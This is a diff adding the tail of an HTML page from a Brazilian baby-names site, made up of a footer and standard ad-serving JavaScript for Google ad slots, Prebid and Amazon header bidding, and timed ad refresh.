+                <style> @media (min-width:0px){#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{width:0;height:0;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{height:0;}}@media (min-width:300px){#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{width:300px;height:290px;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{height:290px;}}@media (min-width:336px){#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{width:336px;height:320px;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{height:320px;}}@media (min-width:768px){#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{width:728px;height:130px;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{height:130px;}}@media (min-width:990px){#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{width:970px;height:130px;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{height:130px;}}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{position:sticky;padding:0px;padding-top:20px;z-index:0;overflow:hidden;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1::before{z-index:-1;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{margin:auto;position:unset;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div::before, #div-gpt-sg-4935e8baebbb53475070b004917bcab1::after{top:0;position:absolute;}</style><div id="div-gpt-sg-4935e8baebbb53475070b004917bcab1" class="ad-unit ad-unit--pt-br #div-gpt-sg-4935e8baebbb53475070b004917bcab1"></div>            </div>
+        </div>
+    </div>
+
+
+</div>
+
+
+
+<footer id="footer" class="footer mt-30">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12">
+                <ul id="footer-list" class="footer-list footer-list--highlight">
+                    <li><a href="/ultimos-nomes/">Últimos Nomes</a></li>
+                    <li><a href="/nomes-pelo-mundo/">Nomes pelo Mundo</a></li>
+                    <li><a href="/bebes/">Nomes de Bebês</a></li>
+                </ul>
+                <ul class="footer-list footer-list--org">
+                    <li><a href="/sobre/">Sobre Nós</a></li>
+                    <li><a href="/politica-privacidade/">Política de Privacidade</a></li>
+                    <li><a href="https://www.7graus.com/MediaKit-PT-BR.pdf" rel="nofollow" target="_blank">Anuncie</a></li>
+                    <li><a href="/termos-uso/">Termos de Uso</a></li>
+                    <li><a href="/contato/">Contato</a></li>
+                    <li><a href="/rss.php">RSS</a></li>
+                </ul>
+                <div class="copyright">
+                    <span class="info">Significado dos Nomes</span>
+                    <span class="separator"> - </span>
+                    <span class="info">Dicionário de Nomes Próprios</span>
+                    <br>
+                    <span>� 2008 - 2026 <a href="https://www.7graus.com/" rel="co-worker nofollow">7Graus</a>.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script type="text/javascript" src="js/dnp_103.js" async=""></script>
+
+            <script async="" src="js/adsbygoogle.js"></script>
+        <script>
+            (adsbygoogle = window.adsbygoogle || []).push({
+                google_ad_client: 'pub-7683395268562108',
+                enable_page_level_ads: false,
+                vignettes: {google_ad_channel: '1709994476'},
+                overlays: {google_ad_channel: '9233261270'}
+            });
+        </script>
+    
+            <script>
+            (function () {
+                var f = function () {
+                    dnp.initMobileOnly();
+                };
+                window[window.attachEvent ? 'attachEvent' : 'addEventListener'](window.attachEvent ? 'onload' : 'load', f, false);
+            })();
+        </script>
+    <script>(function(){googletag.cmd.push(function(){googletag.pubads().setTargeting('pathname', window.location.pathname.endsWith("/")&&window.location.pathname!=="/"?window.location.pathname.slice(1,-1):window.location.pathname?window.location.pathname:"/");googletag.pubads().enableLazyLoad({"fetchMarginPercent":200,"renderMarginPercent":100,"mobileScaling":1});googletag.pubads().disableInitialLoad();googletag.enableServices();var sm0=googletag.sizeMapping().addSize([0,0],[]).addSize([300,0],[[300,250],[250,250]]).addSize([336,0],[[336,280],[300,250],[250,250]]).addSize([768,0],[]).build(),sm1=googletag.sizeMapping().addSize([0,0],[]).addSize([300,0],[[300,250],[250,250]]).addSize([336,0],[[336,280],[300,250],[250,250]]).addSize([768,0],[[468,60],[320,50],[300,50],[234,60]]).addSize([1280,0],[[728,90],[468,60]]).build(),sm2=googletag.sizeMapping().addSize([0,0],[]).addSize([300,0],[[300,250],[250,250]]).addSize([336,0],[[336,280],[300,250],[250,250]]).addSize([768,0],[[728,90],[468,60]]).addSize([990,0],[[970,90],[728,90],[970,66],[468,60]]).build();var ss0=[[336,280],[300,250],[250,250]],ss1=[[728,90],[468,60],[336,280],[320,50],[300,250],[300,50],[250,250],[234,60]],ss2=[[970,90],[970,66],[728,90],[468,60],[336,280],[300,250],[250,250]];s0=googletag.defineSlot('/1062898/DNP_Bebes_Mobile',ss0,'div-gpt-sg-3ee6424043a273c63e943156075afc44').defineSizeMapping(sm0).addService(googletag.pubads()),s1=googletag.defineSlot('/1062898/dicionomes_bebes_leaderboard',ss1,'div-gpt-sg-99fde6880abce16c6d26ff942b79edcc').defineSizeMapping(sm1).addService(googletag.pubads()),s2=googletag.defineSlot('/1062898/DICIONARIONOMESPROPRIOS_BR_ROS_BOTTOM',ss2,'div-gpt-sg-4935e8baebbb53475070b004917bcab1').defineSizeMapping(sm2).addService(googletag.pubads());var slots=[s0,s1,s2];slots.forEach(function(s){googletag.display(s.getSlotElementId())});function debugScript(debug = false, message, slot) {
+                if (debug) {
+                    console.log(message, slot);
+                }
+            }
+            const sgIntervalRefreshSlots = [{"adUnit":"\/1062898\/DNP_Bebes_Mobile","refreshTime":16,"refreshRetryTime":30,"refreshRetryMaxAttempts":10,"retryTime":5},{"adUnit":"\/1062898\/dicionomes_bebes_leaderboard","refreshTime":16,"refreshRetryTime":30,"refreshRetryMaxAttempts":10,"retryTime":5},{"adUnit":"\/1062898\/DICIONARIONOMESPROPRIOS_BR_ROS_BOTTOM","refreshTime":16,"refreshRetryTime":30,"refreshRetryMaxAttempts":10,"retryTime":5}];
+            window.sgIntervalRefreshAds = {
+                adunits: sgIntervalRefreshSlots,
+                slots: [],
+                debug: false
+            };
+            googletag.pubads().getSlots().map(slot => {
+                const intervalAd = sgIntervalRefreshSlots.find(intervalAd => intervalAd.adUnit === slot.getAdUnitPath());
+                if (intervalAd) {
+                    slot.sgIntervalAd = true;
+                    slot.sgIntervalRefreshTime = intervalAd.refreshTime;
+                    slot.sgIntervalTimeAdId = null;
+                    slot.sgIntervalIsVisible = false;
+                    slot.sgIntervalImpressionViewed = false;
+                    slot.sgRemainingTime = slot.sgIntervalRefreshTime; 
+                    slot.sgStartTime = null;
+                    slot.sgRefreshRetryTime = intervalAd.refreshRetryTime;
+                    slot.sgRefreshRetryMaxAttempts = intervalAd.refreshRetryMaxAttempts;
+                    window.sgIntervalRefreshAds.slots.push(slot);
+                }
+                return slot;
+            });
+            
+            function stopIntervalRefresh(slot) {
+                slot.sgRemainingTime = Math.round(slot.sgRemainingTime);
+                clearTimeout(slot.sgIntervalTimeAdId); 
+                slot.sgIntervalTimeAdId = null;
+                slot.sgIntervalIsVisible = false;
+                if (slot.sgStartTime) {
+                    slot.sgRemainingTime = Math.round(slot.sgIntervalRefreshTime - ((performance.now() - slot.sgStartTime) / 1000));
+                    if (slot.sgRemainingTime < 0) {
+                        slot.sgRemainingTime = slot.sgIntervalRefreshTime; 
+                    }
+                }
+            }
+            function startIntervalRefresh(slot) {
+                slot.sgRemainingTime = Math.round(slot.sgRemainingTime);
+                if (slot.sgRemainingTime < 0) {
+                    slot.sgRemainingTime = slot.sgIntervalRefreshTime;
+                }
+                slot.sgIntervalTimeAdId = setTimeout(function() {
+                    
+                (function() {
+                    slot.sgRequestManager = { 
+                        adserverRequestSent: false,
+                        aps: false,
+                        prebid: false
+                    };
+
+                    function biddersBack() {
+                        if (slot.sgRequestManager.aps && slot.sgRequestManager.prebid) {
+                            sendAdserverRequest();
+                        } 
+                        return;
+                    }
+
+                    function sendAdserverRequest() {
+                        if (slot.sgRequestManager.adserverRequestSent === true) {
+                            return;
+                        }
+                        slot.sgRequestManager.adserverRequestSent = true;
+                        googletag.cmd.push(function() {
+                            googletag.pubads().refresh([slot]);
+                        });
+                    }
+
+                    const apsRefreshSlot = {
+                        slotID: slot.getSlotElementId(),
+                        sizes: slot.getSizes().map(size => [size.getWidth(), size.getHeight()])
+                    };
+
+                    apstag.fetchBids({slots: [apsRefreshSlot], timeout: 2000},
+                        function(bids) {
+                            googletag.cmd.push(function(){
+                                apstag.setDisplayBids();
+                                slot.sgRequestManager.aps = true;
+                                biddersBack();
+                            });
+                    });
+
+                    pbjs.que.push(function() {
+                        pbjs.requestBids({
+                            timeout: 2000,
+                            adUnitCodes: [slot.getSlotElementId()],
+                            bidsBackHandler: function() {
+                                pbjs.setTargetingForGPTAsync([slot.getSlotElementId()]);
+                                slot.sgRequestManager.prebid = true;
+                                biddersBack(); 
+                            }
+                        });
+                    });
+
+                    window.setTimeout(function() {
+                        sendAdserverRequest();
+                    }, 2500); 
+                })();
+                
+                    slot.sgRemainingTime = slot.sgIntervalRefreshTime;
+                    slot.sgStartTime = performance.now();
+                }, slot.sgRemainingTime * 1000);
+                if (!slot.sgStartTime) {
+                    slot.sgStartTime = performance.now();
+                }
+                slot.sgIntervalIsVisible = true;
+            }
+            
+            googletag.pubads().addEventListener("impressionViewable", (event) => {
+                if (event.slot.sgIntervalAd) {
+                    event.slot.sgIntervalImpressionViewed = true;
+                    debugScript(sgIntervalRefreshAds.debug,`impressionViewable interval: ${event.slot.getAdUnitPath()} | should refresh in ${event.slot.sgRemainingTime}s`, event.slot);
+                    startIntervalRefresh(event.slot);
+                }
+            });
+            googletag.pubads().addEventListener("slotVisibilityChanged", (event) => {
+                if (event.slot.sgIntervalAd) {
+                    if (event.inViewPercentage < 50 && event.slot.sgIntervalTimeAdId) {
+                        stopIntervalRefresh(event.slot);
+                        debugScript(sgIntervalRefreshAds.debug,`slotVisibilityChanged pause interval at ${event.slot.sgRemainingTime}s refresh: ${event.slot.getAdUnitPath()} | visible area: ${event.inViewPercentage}%`, event.slot);
+                    }
+                    if (
+                        event.inViewPercentage >= 50 &&
+                        event.slot.sgIntervalImpressionViewed && 
+                        !event.slot.sgIntervalIsVisible && 
+                        !event.slot.sgIntervalTimeAdId
+                    ) {
+                        startIntervalRefresh(event.slot);
+                        debugScript(sgIntervalRefreshAds.debug,`slotVisibilityChanged resume interval at ${event.slot.sgRemainingTime}s refresh: ${event.slot.getAdUnitPath()} | visible area: ${event.inViewPercentage}%, should refresh in ${event.slot.sgRemainingTime}s`, event.slot);
+                    }
+                }
+            });
+            
+            googletag.pubads().addEventListener("slotRenderEnded", function(event) {
+                const slot = event.slot;
+                if (!slot.sgIntervalAd) {
+                    return;
+                }
+                
+                // Verificar se o retryTime está definido e é um número válido
+                if (typeof slot.sgRefreshRetryTime !== "number" || isNaN(slot.sgRefreshRetryTime)) {
+                    console.warn(`Retry time não configurado corretamente para o slot: ${slot.getAdUnitPath()}`);
+                    return;
+                }
+                debugScript(sgIntervalRefreshAds.debug,`intervalRefreshAd slotRenderEnded slot: isEmpty: ${event.isEmpty} | ${slot.getAdUnitPath()}`, slot);
+                if(event.isEmpty && !slot.sgIntervalRefreshIsEmpty) {
+                    if (!slot.sgIntervalRefreshIsEmpty) {
+                        slot.sgIntervalRefreshIsEmpty = true;
+                        slot.sgIntervalRefreshIsEmptyCount = 0; 
+                        slot.sgIntervalRefreshIsEmptyTimer = setInterval(function() {
+                            slot.sgIntervalRefreshIsEmptyCount++;
+                            debugScript(sgIntervalRefreshAds.debug,`intervalRefreshAd retry ${slot.getAdUnitPath()} | attempt: ${slot.sgIntervalRefreshIsEmptyCount}`, slot);
+                            
+                            if (slot.sgIntervalRefreshIsEmptyCount >= slot.sgRefreshRetryMaxAttempts) {
+                                clearInterval(slot.sgIntervalRefreshIsEmptyTimer);
+                                slot.sgIntervalRefreshIsEmpty = false;
+                                slot.sgIntervalRefreshIsEmptyTimer = null;
+                                debugScript(sgIntervalRefreshAds.debug,`intervalRefreshAd retry max attempts stop ${slot.getAdUnitPath()}`, slot);
+                                return;
+                            }
+                            
+                            
+                (function() {
+                    slot.sgRequestManager = { 
+                        adserverRequestSent: false,
+                        aps: false,
+                        prebid: false
+                    };
+
+                    function biddersBack() {
+                        if (slot.sgRequestManager.aps && slot.sgRequestManager.prebid) {
+                            sendAdserverRequest();
+                        } 
+                        return;
+                    }
+
+                    function sendAdserverRequest() {
+                        if (slot.sgRequestManager.adserverRequestSent === true) {
+                            return;
+                        }
+                        slot.sgRequestManager.adserverRequestSent = true;
+                        googletag.cmd.push(function() {
+                            googletag.pubads().refresh([slot]);
+                        });
+                    }
+
+                    const apsRefreshSlot = {
+                        slotID: slot.getSlotElementId(),
+                        sizes: slot.getSizes().map(size => [size.getWidth(), size.getHeight()])
+                    };
+
+                    apstag.fetchBids({slots: [apsRefreshSlot], timeout: 2000},
+                        function(bids) {
+                            googletag.cmd.push(function(){
+                                apstag.setDisplayBids();
+                                slot.sgRequestManager.aps = true;
+                                biddersBack();
+                            });
+                    });
+
+                    pbjs.que.push(function() {
+                        pbjs.requestBids({
+                            timeout: 2000,
+                            adUnitCodes: [slot.getSlotElementId()],
+                            bidsBackHandler: function() {
+                                pbjs.setTargetingForGPTAsync([slot.getSlotElementId()]);
+                                slot.sgRequestManager.prebid = true;
+                                biddersBack(); 
+                            }
+                        });
+                    });
+
+                    window.setTimeout(function() {
+                        sendAdserverRequest();
+                    }, 2500); 
+                })();
+                
+                        }, slot.sgRefreshRetryTime * 1000);
+                    }
+                } else if (!event.isEmpty) {
+                    if (slot.sgIntervalRefreshIsEmptyTimer) {
+                        clearInterval(slot.sgIntervalRefreshIsEmptyTimer);
+                        debugScript(sgIntervalRefreshAds.debug,`intervalRefreshAd retry stop on success: isEmpty: ${event.isEmpty} | ${slot.getAdUnitPath()}`, slot);
+                        slot.sgIntervalRefreshIsEmptyTimer = null;
+                    }
+                    slot.sgIntervalRefreshIsEmpty = false;
+                    slot.sgIntervalRefreshIsEmptyCount = 0;
+                }
+            });
+             var gae=function(e,s){if(!window.localStorage || window.localStorage.getItem("sg_gpt_event")!=="1")return;if(typeof gtag!=="undefined"){gtag("event",e,{event_category:"Sg_GPT",event_label:s.getAdUnitPath(),non_interaction:true})}else if(typeof ga!=="undefined")ga("send","event","Sg_GPT",e,s.getAdUnitPath(),0,{nonInteraction:true})};googletag.pubads().addEventListener("impressionViewable",function(e){gae("ImpressionViewable",e.slot)});googletag.pubads().addEventListener("slotRenderEnded",function(e){gae("SlotRenderEnded",e.slot)});window.Sg_GPT_get_slots=function(){return slots};
+                function executeParallelAuctionAlongsidePrebid(){var t={adserverRequestSent:!1,aps:!1,prebid:!1};function s(){t.aps&&t.prebid&&e()}function e(){!0!==t.adserverRequestSent&&(t.adserverRequestSent=!0,googletag.cmd.push(function(){googletag.pubads().refresh()}))}apstag.fetchBids({slots:[s0,s1,s2]},function(e){googletag.cmd.push(function(){apstag.setDisplayBids(),t.aps=!0,s()})}),pbjs.que.push(function(){pbjs.addAdUnits([{"code":"div-gpt-sg-3ee6424043a273c63e943156075afc44","mediaTypes":{"banner":{"sizeConfig":[{"minViewPort":[0,0],"sizes":[]},{"minViewPort":[300,0],"sizes":[[300,250],[250,250]]},{"minViewPort":[336,0],"sizes":[[336,280],[300,250],[250,250]]},{"minViewPort":[768,0],"sizes":[]}]}},"bids":[{"bidder":"yandex","params":{"placementId":"R-A-6880209-11"}},{"bidder":"richaudience","params":{"pid":"iNEIGMjXfh","supplyType":"site"}},{"bidder":"smartadserver","params":{"siteId":"656269","pageId":"1976938","formatId":"130613"}}]},{"code":"div-gpt-sg-99fde6880abce16c6d26ff942b79edcc","mediaTypes":{"banner":{"sizeConfig":[{"minViewPort":[0,0],"sizes":[]},{"minViewPort":[300,0],"sizes":[[300,250],[250,250]]},{"minViewPort":[336,0],"sizes":[[336,280],[300,250],[250,250]]},{"minViewPort":[768,0],"sizes":[[468,60],[320,50],[300,50],[234,60]]},{"minViewPort":[1280,0],"sizes":[[728,90],[468,60]]}]}},"bids":[{"bidder":"yandex","params":{"placementId":"R-A-6880209-9"}},{"bidder":"richaudience","params":{"pid":"5SANyEVmB0","supplyType":"site"}},{"bidder":"smartadserver","params":{"siteId":"656269","pageId":"1976938","formatId":"130611"}}]},{"code":"div-gpt-sg-4935e8baebbb53475070b004917bcab1","mediaTypes":{"banner":{"sizeConfig":[{"minViewPort":[0,0],"sizes":[]},{"minViewPort":[300,0],"sizes":[[300,250],[250,250]]},{"minViewPort":[336,0],"sizes":[[336,280],[300,250],[250,250]]},{"minViewPort":[768,0],"sizes":[[728,90],[468,60]]},{"minViewPort":[990,0],"sizes":[[970,90],[728,90],[970,66],[468,60]]}]}},"bids":[{"bidder":"yandex","params":{"placementId":"R-A-6880209-15"}},{"bidder":"richaudience","params":{"pid":"wKdq2PmRPH","supplyType":"site"}},{"bidder":"smartadserver","params":{"siteId":"656269","pageId":"1976938","formatId":"130617"}}]}]),pbjs.requestBids({timeout:2e3,bidsBackHandler:function(){googletag.cmd.push(function(){pbjs.setTargetingForGPTAsync(),t.prebid=!0,s()})}})}),window.setTimeout(function(){e()},3e3)}executeParallelAuctionAlongsidePrebid();
+            });})()</script>
+    <sg-bhof projecturl="https://www.dicionariodenomesproprios.com.br" contenturl="/bebes/" backofficeurl="https://www.dicionariodenomesproprios.com.br/backoffice/" projectid="13" contentid="0" contenttype="" contenttypefeedback="" contentdata="{
+            " datepublished":"",="" "dateupdated":""="" }"="" style="display:none" mode="production" newarch=""></sg-bhof>
+
+
+</body></html>
